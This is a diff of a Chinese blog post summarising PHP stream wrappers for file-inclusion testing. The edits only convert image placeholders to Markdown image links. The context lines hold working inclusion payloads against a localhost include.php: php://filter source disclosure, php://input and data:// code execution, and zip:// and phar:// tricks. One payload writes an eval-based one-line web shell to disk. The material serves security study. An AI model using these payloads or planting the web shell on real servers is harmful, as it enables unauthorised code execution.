@@ -31,19 +31,19 @@ tags: []
         
         http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/001.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/001.png)
         
     2.  `[文件的相对路径和文件名]`
         
         http://127.0.0.1/include.php?file=./phpinfo.txt
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/002.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/002.png)
         
     3.  `[http：//网络路径和文件名]`
         
         http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/003.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/003.png)
         
 *   **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=TtVg875BKqk9sOzMAzkl%2Fw%3D%3D.p1F41vqvxKsfpbagzA0QMnc9aCRr606FythHNNfFYg64Bbw7HNcxhypWOE8PwDsM)
     
@@ -115,19 +115,19 @@ tags: []
         
         http://127.0.0.1/include.php?file\=php://filter/read\=convert.base64-encode/resource=phpinfo.php
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/004.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/004.png)
         
     2.  `php://input + [POST DATA]`执行php代码
         
         http://127.0.0.1/include.php?file=php://input \[POST DATA部分\] <?php phpinfo(); ?>
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/005.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/005.png)
         
         若有写入权限，写入一句话木马
         
         http://127.0.0.1/include.php?file=php://input \[POST DATA部分\] <?php fputs(fopen('1juhua.php','w'),'<?php @eval($\_GET\[cmd\]); ?>'); ?>
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/006.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/006.png)
         
 *   **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=oCrbAs8K6fMxEVD4f3Bo5w%3D%3D.SjHgPiULNCVLyngF1xa65SSLVv1A5PA%2B1xG9OG8hHKr3nxVrq%2FahNbGloYNs4shT)
     
@@ -151,7 +151,7 @@ tags: []
         
         http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/007.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/007.png)
         
     2.  `compress.bzip2://file.bz2`
         
@@ -159,7 +159,7 @@ tags: []
         
         http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/008.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/008.png)
         
     3.  `compress.zlib://file.gz`
         
@@ -167,7 +167,7 @@ tags: []
         
         http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/009.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/009.png)
         
 *   **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=LqOOpnI4tgOdxV7KHLyiaA%3D%3D.G4t6zyw1uAsknjdnRfhlAEZ4aMXFO%2B9YuYlkvYE6CMk%2BuJdEdBvFyrmBSfrOoxxteQwE5PVQxS1sRcGWNDfFsQ%3D%3D)
     
@@ -197,13 +197,13 @@ tags: []
         
         http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/010.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/010.png)
         
     2.  `data://text/plain;base64,`
         
         http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
         
-        <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/011.png -->
+        ![](/images/posts/网安/漏洞专题/PHP伪协议总结/011.png)
         
 
 `http:// & https://` **协议**
@@ -225,7 +225,7 @@ tags: []
     
     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
     
-    <!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/012.png -->
+    ![](/images/posts/网安/漏洞专题/PHP伪协议总结/012.png)
     
 
 `phar://` **协议**
@@ -235,7 +235,7 @@ tags: []
 
 http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
 
-<!-- img: /assets/images/posts/网安/漏洞专题/PHP伪协议总结/013.png -->
+![](/images/posts/网安/漏洞专题/PHP伪协议总结/013.png)
 
 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。
 
